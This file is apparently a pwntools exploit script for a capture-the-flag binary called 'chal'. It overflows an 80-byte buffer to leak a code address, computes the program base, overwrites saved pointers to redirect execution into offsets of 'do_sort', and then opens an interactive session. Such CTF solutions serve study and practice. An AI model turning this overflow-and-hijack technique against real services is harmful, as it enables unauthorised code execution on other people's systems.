#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('chal')
# context.terminal = ['xfce4-terminal', '--title=GDB', '--zoom=0', '--geometry=128x50+1100+0', '-e']
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("172.17.0.1", 3131)
        time.sleep(1)
        pid = process(["pidof", "run"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-gef
brva 0x13FF
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def solve():

    io.sendline(b"a"*80 + b"A"*8 + p8(0x23))
    io.recvuntil(b"A"*8)
    leak = u64(io.recv(6).ljust(8, b"\x00"))
    exe.address = leak - (exe.sym["main"]+28)
    info("elf base: %#x", exe.address)

    rw = exe.address + 0x4900
    io.send(b"a"*80 + p64(rw) + p64(exe.sym["do_sort"]+8))

    io.send(b"a"*80 + p64(exe.address + 0x48a0 + 0x58) + p64(exe.sym["do_sort"]+216))

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

